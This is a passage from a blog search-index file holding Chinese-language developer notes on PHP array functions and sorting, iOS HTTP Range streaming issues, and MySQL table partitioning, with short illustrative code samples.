","date":"2019-06-30","objectID":"/blog/posts/MonogoDB-%E6%93%8D%E4%BD%9C%E4%BD%BF%E7%94%A8%E5%B0%8F%E8%A8%98/:7:0","tags":["monogodb"],"title":"MonogoDB 操作使用小記","uri":"/blog/posts/MonogoDB-%E6%93%8D%E4%BD%9C%E4%BD%BF%E7%94%A8%E5%B0%8F%E8%A8%98/"},{"categories":["PHP"],"content":"寫了 PHP 一陣子 PHP array function 非常多 所以不是很熟 最近做案子有用到一些實用的 做一下筆記，方便快速尋找 ","date":"2019-06-29","objectID":"/blog/posts/PHP-%E9%99%A3%E5%88%97%E5%AF%A6%E7%94%A8%E6%B6%B5%E5%BC%8F%E5%B0%8F%E8%A8%98/:0:0","tags":["php","array"],"title":"PHP 陣列實用函式小記","uri":"/blog/posts/PHP-%E9%99%A3%E5%88%97%E5%AF%A6%E7%94%A8%E6%B6%B5%E5%BC%8F%E5%B0%8F%E8%A8%98/"},{"categories":["PHP"],"content":"array_chunk 陣列切割多個區塊函式 簡單說明一下，有時候需要多批陣列 這時候就用得到這個函式 array_chunk ( array $array , int $size [, bool $preserve_keys = FALSE ] ) : array 第三個參數是否要保留 key PHP: array_chunk - Manual \u003c?php function partition( $list, $p ) { $listlen = count( $list ); $partlen = floor( $listlen / $p ); $partrem = $listlen % $p; $partition = array(); $mark = 0; for ($px = 0; $px \u003c $p; $px++) { $incr = ($px \u003c $partrem) ? $partlen + 1 : $partlen; $partition[$px] = array_slice( $list, $mark, $incr ); $mark += $incr; } return $partition; } $citylist = array( \"Black Canyon City\", \"Chandler\", \"Flagstaff\", \"Gilbert\", \"Glendale\", \"Globe\", \"Mesa\", \"Miami\", \"Phoenix\", \"Peoria\", \"Prescott\", \"Scottsdale\", \"Sun City\", \"Surprise\", \"Tempe\", \"Tucson\", \"Wickenburg\" ); print_r( partition( $citylist, 3 ) ); ?\u003e 剛好官網看到很有趣的寫法 partition 決定個數，依照陣列做切割 感覺有機會用到 ","date":"2019-06-29","objectID":"/blog/posts/PHP-%E9%99%A3%E5%88%97%E5%AF%A6%E7%94%A8%E6%B6%B5%E5%BC%8F%E5%B0%8F%E8%A8%98/:1:0","tags":["php","array"],"title":"PHP 陣列實用函式小記","uri":"/blog/posts/PHP-%E9%99%A3%E5%88%97%E5%AF%A6%E7%94%A8%E6%B6%B5%E5%BC%8F%E5%B0%8F%E8%A8%98/"},{"categories":["PHP"],"content":"array_column 對二維陣列對裡面第一層抓取 key 資料出來。 array_column ( array $input , mixed $column_key [, mixed $index_key = null ] ) : array 感覺很適合 Database 搜尋出來資料，抓取部分欄位。 這時可以用 array_filter,array_unique,array_values 做整理。 相當實用!! PHP: array_column - Manual 當然用途還滿多了，第一個能對**isset,**get 模術方法去抓資料 ","date":"2019-06-29","objectID":"/blog/posts/PHP-%E9%99%A3%E5%88%97%E5%AF%A6%E7%94%A8%E6%B6%B5%E5%BC%8F%E5%B0%8F%E8%A8%98/:2:0","tags":["php","array"],"title":"PHP 陣列實用函式小記","uri":"/blog/posts/PHP-%E9%99%A3%E5%88%97%E5%AF%A6%E7%94%A8%E6%B6%B5%E5%BC%8F%E5%B0%8F%E8%A8%98/"},{"categories":["PHP"],"content":"array_count_value array_count_values ( array $array ) : array 統計數組中所有的值 \u003c?php $array = array(1, \"hello\", 1, \"world\", \"hello\"); print_r(array_count_values($array)); // Array // ( // [1] =\u003e 2 // [hello] =\u003e 2 // [world] =\u003e 1 // ) ?\u003e PHP: array_count_values - Manual ","date":"2019-06-29","objectID":"/blog/posts/PHP-%E9%99%A3%E5%88%97%E5%AF%A6%E7%94%A8%E6%B6%B5%E5%BC%8F%E5%B0%8F%E8%A8%98/:3:0","tags":["php","array"],"title":"PHP 陣列實用函式小記","uri":"/blog/posts/PHP-%E9%99%A3%E5%88%97%E5%AF%A6%E7%94%A8%E6%B6%B5%E5%BC%8F%E5%B0%8F%E8%A8%98/"},{"categories":["PHP"],"content":"array_diff array_diff ( array $array1 , array $array2 [, array $... ] ) : array 對比 array1 和其他一個或者多個數組，返回在 array1 中但是不在其他 array 裡的值。 目前沒什麼用到，但感覺還是有用處的… ","date":"2019-06-29","objectID":"/blog/posts/PHP-%E9%99%A3%E5%88%97%E5%AF%A6%E7%94%A8%E6%B6%B5%E5%BC%8F%E5%B0%8F%E8%A8%98/:4:0","tags":["php","array"],"title":"PHP 陣列實用函式小記","uri":"/blog/posts/PHP-%E9%99%A3%E5%88%97%E5%AF%A6%E7%94%A8%E6%B6%B5%E5%BC%8F%E5%B0%8F%E8%A8%98/"},{"categories":["PHP"],"content":"array_fill array_fill ( int $start_index , int $num , mixed $value ) : array 填充陣列用的函式。 PHP: array_fill - Manual ","date":"2019-06-29","objectID":"/blog/posts/PHP-%E9%99%A3%E5%88%97%E5%AF%A6%E7%94%A8%E6%B6%B5%E5%BC%8F%E5%B0%8F%E8%A8%98/:5:0","tags":["php","array"],"title":"PHP 陣列實用函式小記","uri":"/blog/posts/PHP-%E9%99%A3%E5%88%97%E5%AF%A6%E7%94%A8%E6%B6%B5%E5%BC%8F%E5%B0%8F%E8%A8%98/"},{"categories":["PHP"],"content":"array_filter array_filter ( array $array [, callable $callback [, int $flag = 0 ]] ) : array 過濾陣列(自定)函式。 我覺得還滿實用的!! 當 callback 沒有設定，預設 null, ‘’(空字串)都會被清除 相當實用!!! callback 使用的回调函数 如果没有提供 callback 函数， 将删除 array 中所有等值为 FALSE 的条目。更多信息见转换为布尔值。 \u003c?php $arr = ['a' =\u003e 1, 'b' =\u003e 2, 'c' =\u003e 3, 'd' =\u003e 4]; var_dump(array_filter($arr, function($k) { return $k == 'b'; }, ARRAY_FILTER_USE_KEY)); var_dump(array_filter($arr, function($v, $k) { return $k == 'b' || $v == 4; }, ARRAY_FILTER_USE_BOTH)); ?\u003e // array(1) { // [\"b\"]=\u003e // int(2) // } // array(2) { // [\"b\"]=\u003e // int(2) // [\"d\"]=\u003e // int(4) // } ","date":"2019-06-29","objectID":"/blog/posts/PHP-%E9%99%A3%E5%88%97%E5%AF%A6%E7%94%A8%E6%B6%B5%E5%BC%8F%E5%B0%8F%E8%A8%98/:6:0","tags":["php","array"],"title":"PHP 陣列實用函式小記","uri":"/blog/posts/PHP-%E9%99%A3%E5%88%97%E5%AF%A6%E7%94%A8%E6%B6%B5%E5%BC%8F%E5%B0%8F%E8%A8%98/"},{"categories":["PHP"],"content":"array_flip 陣列 key 跟 value 做交換 array_flip ( array $array ) : array 算是滿實用的函式。 ","date":"2019-06-29","objectID":"/blog/posts/PHP-%E9%99%A3%E5%88%97%E5%AF%A6%E7%94%A8%E6%B6%B5%E5%BC%8F%E5%B0%8F%E8%A8%98/:7:0","tags":["php","array"],"title":"PHP 陣列實用函式小記","uri":"/blog/posts/PHP-%E9%99%A3%E5%88%97%E5%AF%A6%E7%94%A8%E6%B6%B5%E5%BC%8F%E5%B0%8F%E8%A8%98/"},{"categories":["PHP"],"content":"array_push \u0026 $var[] array_push ( array \u0026$array , mixed $value1 [, mixed $... ] ) : int 回傳 增加數量。 但還是推薦使用$var[] ","date":"2019-06-29","objectID":"/blog/posts/PHP-%E9%99%A3%E5%88%97%E5%AF%A6%E7%94%A8%E6%B6%B5%E5%BC%8F%E5%B0%8F%E8%A8%98/:8:0","tags":["php","array"],"title":"PHP 陣列實用函式小記","uri":"/blog/posts/PHP-%E9%99%A3%E5%88%97%E5%AF%A6%E7%94%A8%E6%B6%B5%E5%BC%8F%E5%B0%8F%E8%A8%98/"},{"categories":["PHP"],"content":"array_unshift 跟上一個array_push很像，但他是加在陣列前面 \u003c?php $queue = array(\"orange\", \"banana\"); array_unshift($queue, \"apple\", \"raspberry\"); print_r($queue); ?\u003e // Array // ( // [0] =\u003e apple // [1] =\u003e raspberry // [2] =\u003e orange // [3] =\u003e banana // ) ","date":"2019-06-29","objectID":"/blog/posts/PHP-%E9%99%A3%E5%88%97%E5%AF%A6%E7%94%A8%E6%B6%B5%E5%BC%8F%E5%B0%8F%E8%A8%98/:8:1","tags":["php","array"],"title":"PHP 陣列實用函式小記","uri":"/blog/posts/PHP-%E9%99%A3%E5%88%97%E5%AF%A6%E7%94%A8%E6%B6%B5%E5%BC%8F%E5%B0%8F%E8%A8%98/"},{"categories":["PHP"],"content":"array_pop 移除(回傳)後面陣列 ","date":"2019-06-29","objectID":"/blog/posts/PHP-%E9%99%A3%E5%88%97%E5%AF%A6%E7%94%A8%E6%B6%B5%E5%BC%8F%E5%B0%8F%E8%A8%98/:8:2","tags":["php","array"],"title":"PHP 陣列實用函式小記","uri":"/blog/posts/PHP-%E9%99%A3%E5%88%97%E5%AF%A6%E7%94%A8%E6%B6%B5%E5%BC%8F%E5%B0%8F%E8%A8%98/"},{"categories":["PHP"],"content":"array_shift 移除(回傳)前面陣列 ","date":"2019-06-29","objectID":"/blog/posts/PHP-%E9%99%A3%E5%88%97%E5%AF%A6%E7%94%A8%E6%B6%B5%E5%BC%8F%E5%B0%8F%E8%A8%98/:8:3","tags":["php","array"],"title":"PHP 陣列實用函式小記","uri":"/blog/posts/PHP-%E9%99%A3%E5%88%97%E5%AF%A6%E7%94%A8%E6%B6%B5%E5%BC%8F%E5%B0%8F%E8%A8%98/"},{"categories":["PHP"],"content":"array_rand array_rand ( array $array [, int $num = 1 ] ): mixed 隨機回傳陣列，第二個陣列可以回傳隨機個數 感覺實用!! ","date":"2019-06-29","objectID":"/blog/posts/PHP-%E9%99%A3%E5%88%97%E5%AF%A6%E7%94%A8%E6%B6%B5%E5%BC%8F%E5%B0%8F%E8%A8%98/:9:0","tags":["php","array"],"title":"PHP 陣列實用函式小記","uri":"/blog/posts/PHP-%E9%99%A3%E5%88%97%E5%AF%A6%E7%94%A8%E6%B6%B5%E5%BC%8F%E5%B0%8F%E8%A8%98/"},{"categories":["PHP"],"content":"array_slice array_slice ( array $array , int $offset [, int $length = NULL [, bool $preserve_keys = false ]] ) : array 從陣列中取出一段。 比較特別的是 $offset,$length 可以用負數，為負數代表就是抓取後面位置 $offset,$length 可容錯，不會有溢位的問題!!相當時用 2019-07-01 今天做這個有 index(key)容錯 假如長度少於 key 內容，會取出陣列最後面一個位置 算是滿好用。 array_unique 後可以省略做 array_values 直接做 array_slice 真的非常方便 array_unique 也可以比對整個 array,object sort($arr, SORT_STRING); 原理如下網站 PHP 排序模式 SORT_NUMERIC / SORT_STRING / SORT_NATURAL 详解 備份圖 ","date":"2019-06-29","objectID":"/blog/posts/PHP-%E9%99%A3%E5%88%97%E5%AF%A6%E7%94%A8%E6%B6%B5%E5%BC%8F%E5%B0%8F%E8%A8%98/:10:0","tags":["php","array"],"title":"PHP 陣列實用函式小記","uri":"/blog/posts/PHP-%E9%99%A3%E5%88%97%E5%AF%A6%E7%94%A8%E6%B6%B5%E5%BC%8F%E5%B0%8F%E8%A8%98/"},{"categories":["PHP"],"content":"array_splice array_splice ( array \u0026$input , int $offset [, int $length = count($input) [, mixed $replacement = array() ]] ) : array ","date":"2019-06-29","objectID":"/blog/posts/PHP-%E9%99%A3%E5%88%97%E5%AF%A6%E7%94%A8%E6%B6%B5%E5%BC%8F%E5%B0%8F%E8%A8%98/:11:0","tags":["php","array"],"title":"PHP 陣列實用函式小記","uri":"/blog/posts/PHP-%E9%99%A3%E5%88%97%E5%AF%A6%E7%94%A8%E6%B6%B5%E5%BC%8F%E5%B0%8F%E8%A8%98/"},{"categories":["PHP"],"content":"array_sum 把所有陣列做加總。 ","date":"2019-06-29","objectID":"/blog/posts/PHP-%E9%99%A3%E5%88%97%E5%AF%A6%E7%94%A8%E6%B6%B5%E5%BC%8F%E5%B0%8F%E8%A8%98/:12:0","tags":["php","array"],"title":"PHP 陣列實用函式小記","uri":"/blog/posts/PHP-%E9%99%A3%E5%88%97%E5%AF%A6%E7%94%A8%E6%B6%B5%E5%BC%8F%E5%B0%8F%E8%A8%98/"},{"categories":["PHP"],"content":"array_search array_search ( mixed $needle , array $haystack [, bool $strict = FALSE ] ) : mixed 陣列搜尋，會回傳找到的位置正確說是 key 值。 ","date":"2019-06-29","objectID":"/blog/posts/PHP-%E9%99%A3%E5%88%97%E5%AF%A6%E7%94%A8%E6%B6%B5%E5%BC%8F%E5%B0%8F%E8%A8%98/:13:0","tags":["php","array"],"title":"PHP 陣列實用函式小記","uri":"/blog/posts/PHP-%E9%99%A3%E5%88%97%E5%AF%A6%E7%94%A8%E6%B6%B5%E5%BC%8F%E5%B0%8F%E8%A8%98/"},{"categories":["PHP"],"content":"多維度搜尋 跟 array_search 神搭配 // $userdb=Array // ( // (0) =\u003e Array // ( // (uid) =\u003e '100', // (name) =\u003e 'Sandra Shush', // (url) =\u003e 'urlof100' // ), // (1) =\u003e Array // ( // (uid) =\u003e '5465', // (name) =\u003e 'Stefanie Mcmohn', // (pic_square) =\u003e 'urlof100' // ), // (2) =\u003e Array // ( // (uid) =\u003e '40489', // (name) =\u003e 'Michael', // (pic_square) =\u003e 'urlof40489' // ) // ); $key = array_search(40489, array_column($userdb, 'uid')); ","date":"2019-06-29","objectID":"/blog/posts/PHP-%E9%99%A3%E5%88%97%E5%AF%A6%E7%94%A8%E6%B6%B5%E5%BC%8F%E5%B0%8F%E8%A8%98/:13:1","tags":["php","array"],"title":"PHP 陣列實用函式小記","uri":"/blog/posts/PHP-%E9%99%A3%E5%88%97%E5%AF%A6%E7%94%A8%E6%B6%B5%E5%BC%8F%E5%B0%8F%E8%A8%98/"},{"categories":["PHP"],"content":"查詢最後一個 key array_search('green', array_reverse($array)); How do I find last occurence of “needle” in array php - Stack Overflow ","date":"2019-06-29","objectID":"/blog/posts/PHP-%E9%99%A3%E5%88%97%E5%AF%A6%E7%94%A8%E6%B6%B5%E5%BC%8F%E5%B0%8F%E8%A8%98/:13:2","tags":["php","array"],"title":"PHP 陣列實用函式小記","uri":"/blog/posts/PHP-%E9%99%A3%E5%88%97%E5%AF%A6%E7%94%A8%E6%B6%B5%E5%BC%8F%E5%B0%8F%E8%A8%98/"},{"categories":["PHP"],"content":"array_unique array_unique ( array $array [, int $sort_flags = SORT_STRING ] ) : array sort_flags 第二個可選參數 sort_flags 可用於修改排序行為： 排序類型標記： SORT_REGULAR - 按照通常方法比較（不修改類型） SORT_NUMERIC - 按照數字形式比較 SORT_STRING - 按照字符串形式比較 SORT_LOCALE_STRING - 根據當前的本地化設置，按照字符串比較。 但我覺得注意 array_unique 移除 value，但是不會合併 切記可以需要做 array_value or array_slice 切記可以需要做 array_value or array_slice 切記可以需要做 array_value or array_slice 也非一定要用上面兩個 可以做foreach 但是做for($i = 0;$i \u003c count(xxx); $i++) (PS: $cnt = count(xxx); for($i = 0; $i \u003c $cnt; $i++\u003e)會比較好) 可能需要注意會有問題!!! ","date":"2019-06-29","objectID":"/blog/posts/PHP-%E9%99%A3%E5%88%97%E5%AF%A6%E7%94%A8%E6%B6%B5%E5%BC%8F%E5%B0%8F%E8%A8%98/:14:0","tags":["php","array"],"title":"PHP 陣列實用函式小記","uri":"/blog/posts/PHP-%E9%99%A3%E5%88%97%E5%AF%A6%E7%94%A8%E6%B6%B5%E5%BC%8F%E5%B0%8F%E8%A8%98/"},{"categories":["PHP"],"content":"類似對二維陣列做 array_column 方法 \u003c?php $details = array( 0 =\u003e array(\"id\"=\u003e\"1\", \"name\"=\u003e\"Mike\", \"num\"=\u003e\"9876543210\"), 1 =\u003e array(\"id\"=\u003e\"2\", \"name\"=\u003e\"Carissa\", \"num\"=\u003e\"08548596258\"), 2 =\u003e array(\"id\"=\u003e\"1\", \"name\"=\u003e\"Mathew\", \"num\"=\u003e\"784581254\"), ); function unique_multidim_array($array, $key) { $temp_array = array(); $i = 0; $key_array = array(); foreach($array as $val) { if (!in_array($val[$key], $key_array)) { $key_array[$i] = $val[$key]; $temp_array[$i] = $val; } $i++; } return $temp_array; } $details = unique_multidim_array($details,'id'); // $details = array( // 0 =\u003e array(\"id\"=\u003e\"1\",\"name\"=\u003e\"Mike\",\"num\"=\u003e\"9876543210\"), // 1 =\u003e array(\"id\"=\u003e\"2\",\"name\"=\u003e\"Carissa\",\"num\"=\u003e\"08548596258\"), // ); ?\u003e ","date":"2019-06-29","objectID":"/blog/posts/PHP-%E9%99%A3%E5%88%97%E5%AF%A6%E7%94%A8%E6%B6%B5%E5%BC%8F%E5%B0%8F%E8%A8%98/:14:1","tags":["php","array"],"title":"PHP 陣列實用函式小記","uri":"/blog/posts/PHP-%E9%99%A3%E5%88%97%E5%AF%A6%E7%94%A8%E6%B6%B5%E5%BC%8F%E5%B0%8F%E8%A8%98/"},{"categories":["PHP"],"content":"array_values 我以為有排序合併效果，但是沒有!! 詳細看官往範例 \u003c?php $a = array( 3 =\u003e 11, 1 =\u003e 22, 2 =\u003e 33, ); $a[0] = 44; print_r( array_values( $a )); // ==\u003e // Array( // [0] =\u003e 11 // [1] =\u003e 22 // [2] =\u003e 33 // [3] =\u003e 44 // ) ?\u003e ","date":"2019-06-29","objectID":"/blog/posts/PHP-%E9%99%A3%E5%88%97%E5%AF%A6%E7%94%A8%E6%B6%B5%E5%BC%8F%E5%B0%8F%E8%A8%98/:15:0","tags":["php","array"],"title":"PHP 陣列實用函式小記","uri":"/blog/posts/PHP-%E9%99%A3%E5%88%97%E5%AF%A6%E7%94%A8%E6%B6%B5%E5%BC%8F%E5%B0%8F%E8%A8%98/"},{"categories":["PHP"],"content":"array_walk vs array_map 我目前還很少用到這些，不過這個函式也滿像的，所以特別記錄一下。 簡單說最大的差異 array_walk 會回傳 true,false，array_map 會回傳 callback 傳回去資料 假如要對原資料變數做更動，使用 array_walk ，但切記宣告記得在function callback(\u0026$xxx,...)(\u0026符號) 光\u0026這點我覺得不是很實用了 詳細：php array_map 与 array_walk 使用对比 - 偶木 - CSDN 博客 ","date":"2019-06-29","objectID":"/blog/posts/PHP-%E9%99%A3%E5%88%97%E5%AF%A6%E7%94%A8%E6%B6%B5%E5%BC%8F%E5%B0%8F%E8%A8%98/:16:0","tags":["php","array"],"title":"PHP 陣列實用函式小記","uri":"/blog/posts/PHP-%E9%99%A3%E5%88%97%E5%AF%A6%E7%94%A8%E6%B6%B5%E5%BC%8F%E5%B0%8F%E8%A8%98/"},{"categories":["PHP"],"content":"in_array in_array ( mixed $needle , array $haystack [, bool $strict = FALSE ] ) : bool 跟 array_search 有點像，但 return 回去是 bollean 詳細可參考： [PHP] in_array 與 array_search 在陣列(Array)中尋找值是否存在 - RicharLin.Tw ","date":"2019-06-29","objectID":"/blog/posts/PHP-%E9%99%A3%E5%88%97%E5%AF%A6%E7%94%A8%E6%B6%B5%E5%BC%8F%E5%B0%8F%E8%A8%98/:17:0","tags":["php","array"],"title":"PHP 陣列實用函式小記","uri":"/blog/posts/PHP-%E9%99%A3%E5%88%97%E5%AF%A6%E7%94%A8%E6%B6%B5%E5%BC%8F%E5%B0%8F%E8%A8%98/"},{"categories":["PHP"],"content":"usort,uksort 自定排序 其實我對 callback 排序記不太住 //由小排到大 $arr = [3,1,2,5,4]; usort($arr,function($a,$b){ return $a \u003e $b}); //大於、負數在前(false)由小排到大 $arr = [3,1,2,5,4]; usort($arr,function($a,$b){ if($a == $b){ return 0; } return $a \u003c $b ? -1 : 1; }); //由大排到小 $arr = [3,1,2,5,4]; usort($arr,function($a,$b){ return $a \u003c $b}) //小於、正數在前(true)由大排到小 $arr = [3,1,2,5,4]; usort($arr,function($a,$b){ if($a == $b){ return 0; } return $a \u003c $b ? 1 : -1; }); PHP usort()的使用 - liuj8929 的博客 - CSDN 博客 php 陣列排序 usort、uksort 與 sort 函式用法 | 程式前沿 关于 php 中 usort 函数的解读 - 简书 ","date":"2019-06-29","objectID":"/blog/posts/PHP-%E9%99%A3%E5%88%97%E5%AF%A6%E7%94%A8%E6%B6%B5%E5%BC%8F%E5%B0%8F%E8%A8%98/:18:0","tags":["php","array"],"title":"PHP 陣列實用函式小記","uri":"/blog/posts/PHP-%E9%99%A3%E5%88%97%E5%AF%A6%E7%94%A8%E6%B6%B5%E5%BC%8F%E5%B0%8F%E8%A8%98/"},{"categories":["PHP"],"content":"PHP 另類比較方法 \u003c=\u003e 太空船操作符（組合比較符） 太空船操作符用於比較兩個表達式。當$a小於(-1)、等於(0)或大於(1)$b 時它分別返回-1、0 或 1。 比較的原則是沿用 PHP 的常規比較規則進行的。 這方法感覺好記!!! 但只能用在 PHP 7.1 \u003c?php // tested on PHP 7.1 $a = [2, 1, 3, 6, 5, 4, 7]; $asc = $desc = $a; usort($asc, function (int $a, int $b) { return ($a \u003c=\u003e $b); }); usort($desc, function (int $a, int $b) { return -($a \u003c=\u003e $b); }); print_r([ $a, $asc, $desc ]); What is \u003c=\u003e (the ‘Spaceship’ Operator) in PHP 7? - Stack Overflow PHP: rfc:combined-comparison-operator 還有多個欄位排序方法 function order_func($a, $b) { return [$a-\u003ex, $a-\u003ey, $a-\u003efoo] \u003c=\u003e [$b-\u003ex, $b-\u003ey, $b-\u003efoo]; } // or function order_func($a, $b) { return ($a-\u003e$x \u003c=\u003e $b-\u003ex) ?: ($a-\u003ey \u003c=\u003e $b-\u003ey) ?: ($a-\u003efoo \u003c=\u003e $b-\u003efoo); } ","date":"2019-06-29","objectID":"/blog/posts/PHP-%E9%99%A3%E5%88%97%E5%AF%A6%E7%94%A8%E6%B6%B5%E5%BC%8F%E5%B0%8F%E8%A8%98/:18:1","tags":["php","array"],"title":"PHP 陣列實用函式小記","uri":"/blog/posts/PHP-%E9%99%A3%E5%88%97%E5%AF%A6%E7%94%A8%E6%B6%B5%E5%BC%8F%E5%B0%8F%E8%A8%98/"},{"categories":["PHP"],"content":"shuffle shuffle ( array \u0026$array ) : bool 隨機排序陣列函式。 實用!!! ","date":"2019-06-29","objectID":"/blog/posts/PHP-%E9%99%A3%E5%88%97%E5%AF%A6%E7%94%A8%E6%B6%B5%E5%BC%8F%E5%B0%8F%E8%A8%98/:19:0","tags":["php","array"],"title":"PHP 陣列實用函式小記","uri":"/blog/posts/PHP-%E9%99%A3%E5%88%97%E5%AF%A6%E7%94%A8%E6%B6%B5%E5%BC%8F%E5%B0%8F%E8%A8%98/"},{"categories":["PHP"],"content":"explode = list() explode ( string $delimiter , string $string [, int $limit = PHP_INT_MAX ] ) : array $data = \"foo:*:1023:1000::/home/foo:/bin/sh\"; list($user, $pass, $uid, $gid, $gecos, $home, $shell) = explode(\":\", $data); 老實說我不常這樣寫，算是小記 ","date":"2019-06-29","objectID":"/blog/posts/PHP-%E9%99%A3%E5%88%97%E5%AF%A6%E7%94%A8%E6%B6%B5%E5%BC%8F%E5%B0%8F%E8%A8%98/:20:0","tags":["php","array"],"title":"PHP 陣列實用函式小記","uri":"/blog/posts/PHP-%E9%99%A3%E5%88%97%E5%AF%A6%E7%94%A8%E6%B6%B5%E5%BC%8F%E5%B0%8F%E8%A8%98/"},{"categories":["PHP"],"content":"array_key_exists() vs isset() \u003c?php $search_array = array('first' =\u003e null, 'second' =\u003e 4); // returns false isset($search_array['first']); // returns true array_key_exists('first', $search_array); ?\u003e ","date":"2019-06-29","objectID":"/blog/posts/PHP-%E9%99%A3%E5%88%97%E5%AF%A6%E7%94%A8%E6%B6%B5%E5%BC%8F%E5%B0%8F%E8%A8%98/:21:0","tags":["php","array"],"title":"PHP 陣列實用函式小記","uri":"/blog/posts/PHP-%E9%99%A3%E5%88%97%E5%AF%A6%E7%94%A8%E6%B6%B5%E5%BC%8F%E5%B0%8F%E8%A8%98/"},{"categories":["PHP"],"content":"其他小記(感想) 最近寫久了，雖然覺得 PHP 處理 array 很方便，但發現都是 function base 程式寫上面不是很方便 最近剛好看到 Laravel 有 Collection ， 改善我上面說的缺點 有爬過文章說跟 array 校能差不多!! 集合 - Laravel - 為網頁藝術家創造的 PHP 框架 ","date":"2019-06-29","objectID":"/blog/posts/PHP-%E9%99%A3%E5%88%97%E5%AF%A6%E7%94%A8%E6%B6%B5%E5%BC%8F%E5%B0%8F%E8%A8%98/:22:0","tags":["php","array"],"title":"PHP 陣列實用函式小記","uri":"/blog/posts/PHP-%E9%99%A3%E5%88%97%E5%AF%A6%E7%94%A8%E6%B6%B5%E5%BC%8F%E5%B0%8F%E8%A8%98/"},{"categories":["HTML"],"content":"最近做音樂串流， IOS 發生了不能播放音樂問題 找了很久，看了一下封包 結果發現一見很怪的事情 IOS 發送 Range: bytes=0-1 但是 Server 正常回傳 但 IOS 會無限發送 Range: bytes=0-1 记一则流媒体传输上的坑 | Wildog iOS h5 点播播放 mp4 视频遇到的坑,ios 的 h5 不能播放视频等 - 简书 使用 PHP 读取视频流，IOS 系统无法观看的问题解决方法 – Jeffrey Wang 的个人博客 Swift HTTPURLResponse 的一个坑 - 简书 HTTP/2 约束 Header 大小写 - phantomVK Blog 簡單小記 request header: Range: bytes=0-x response header: Content-Length: 0-x/n 聊一聊 HTTP 的 Range, Content-Range | HappyCoding:) ","date":"2019-06-27","objectID":"/blog/posts/Content-Range-%E5%B0%8F%E8%A8%98/:0:0","tags":["range"],"title":"Content-Range 小記","uri":"/blog/posts/Content-Range-%E5%B0%8F%E8%A8%98/"},{"categories":["HTML"],"content":"延升想法 最近同事串流 CDN 服務 再想用這種 Range用 https 去做 Range 感覺沒有到很方便 現在很多用 hls(m3u8)方式，可能就不會遇到這種問題 orz 剛打完就剛好看到有人講到video 标签在 iPhone 手机上不能播放？万能的知乎大神请指引我，实在没办法了 - 知乎 ","date":"2019-06-27","objectID":"/blog/posts/Content-Range-%E5%B0%8F%E8%A8%98/:1:0","tags":["range"],"title":"Content-Range 小記","uri":"/blog/posts/Content-Range-%E5%B0%8F%E8%A8%98/"},{"categories":["MySQL"],"content":"最近接觸一點 Partition 但這個東西不是很熟悉 所以小記一些東西(都是網路上找的) ","date":"2019-06-25","objectID":"/blog/posts/MySQL-Partition-%E5%B0%8F%E8%A8%98/:0:0","tags":["mysql","partition"],"title":"MySQL Partition 小記","uri":"/blog/posts/MySQL-Partition-%E5%B0%8F%E8%A8%98/"},{"categories":["MySQL"],"content":"主鍵和 Parition 1503 - A PRIMARY KEY must include all columns in the table's partitioning function MYSQL 的分区字段，必须包含在主键字段内 - 王 庆 - 博客园 2019-08-26 小記 要把 patition 的欄位加到 PRIMARY KEY 簡單說說我的看法 partition 用到的欄位要加進去 primary key 這樣切的 partition 時需要注意 不常用就會忘記 今天，發現用 MySQL 子查詢 partition table explain 發現會吃免一個 partition SELECT xxx, (SELECT count(1) FROM xxxx WHERE id = a.id) as count FROM a where id = 'xxx' 目前不確定是不是因為 id 為字串關系 但目前系統查詢還不會很慢 MySQL 之 KEY 分區引發的血案 - 每日頭條 ","date":"2019-06-25","objectID":"/blog/posts/MySQL-Partition-%E5%B0%8F%E8%A8%98/:1:0","tags":["mysql","partition"],"title":"MySQL Partition 小記","uri":"/blog/posts/MySQL-Partition-%E5%B0%8F%E8%A8%98/"},{"categories":["MySQL"],"content":"SQL 查詢 Partition 語法 SELECT * FROM information_schema.partitions WHERE TABLE_SCHEMA='your_database' AND TABLE_NAME = 'your_table' AND PARTITION_NAME IS NOT NULL Are the MySQL Partitions visible in the EXPLAIN plan of a SELECT….? - Stack Overflow ","date":"2019-06-25","objectID":"/blog/posts/MySQL-Partition-%E5%B0%8F%E8%A8%98/:2:0","tags":["mysql","partition"],"title":"MySQL Partition 小記","uri":"/blog/posts/MySQL-Partition-%E5%B0%8F%E8%A8%98/"},{"categories":["MySQL"],"content":"EXPLAIN 沒有出現 Partition 用EXPLAIN PARTITIONS Are the MySQL Partitions visible in the EXPLAIN plan of a SELECT….? - Stack Overflow mysql - How to view information of partitions in a table? - Stack Overflow ","date":"2019-06-25","objectID":"/blog/posts/MySQL-Partition-%E5%B0%8F%E8%A8%98/:3:0","tags":["mysql","partition"],"title":"MySQL Partition 小記","uri":"/blog/posts/MySQL-Partition-%E5%B0%8F%E8%A8%98/"},{"categories":["MySQL"],"content":"Partition 分配不均的問題 用質數，我也沒有實驗過… MySQL 之 KEY 分區引發的血案 - 每日頭條 備份圖 mysql 中的 key 分区为什么总是一半有数据，一半没有数据？-CSDN 论坛 如果設置40，64，128等偶數個分區數（PARTITIONS 64），會導致編號為奇數的分區（p1, p3, p5, p7, ... p2n-1）完全插不進數據； 如果設置63，121（PARTITIONS 63）這種奇數但非質數個分區數，所有分區都會有數據，但是不均勻； 如果設置137，31這種質數個分區數（PARTITIONS 137），所有分區都會有數據，並且非常均勻； 原文網址：https://kknews.cc/other/mjzoq52.html ","date":"2019-06-25","objectID":"/blog/posts/MySQL-Partition-%E5%B0%8F%E8%A8%98/:4:0","tags":["mysql","partition"],"title":"MySQL Partition 小記","uri":"/blog/posts/MySQL-Partition-%E5%B0%8F%E8%A8%98/"},{"categories":["MySQL"],"content":"KEY \u0026 Hash 差異 MySQL 分区总结 - iVictor - 博客园 看不是很懂，Hash 不能重覆,Key 可以??? 等研究出來再補 ","date":"2019-06-25","objectID":"/blog/posts/MySQL-Partition-%E5%B0%8F%E8%A8%98/:5:0","tags":["mysql","partition"],"title":"MySQL Partition 小記","uri":"/blog/posts/MySQL-Partition-%E5%B0%8F%E8%A8%98/"},{"categories":["MySQL"],"content":"手建和內建 Partition 差別 手工分表 VS 分區表 手工分表的邏輯，找到所有需要更新的分表，然後依次更新，在性能上，與分區表並沒有實質的差別 分區表由 Server 層決定使用哪個分區，手工分表由應用代碼決定使用哪一個分表 MySQL – 分区表 | 点滴积累 備份圖 ","date":"2019-06-25","objectID":"/blog/posts/MySQL-Partition-%E5%B0%8F%E8%A8%98/:6:0","tags":["mysql","partition"],"title":"MySQL Partition 小記","uri":"/blog/posts/MySQL-Partition-%E5%B0%8F%E8%A8%98/"},{"categories":["MySQL"],"content":"UUID 主鍵 vs 流水號 主鍵 MySQL 使用自增 ID 主键和 UUID 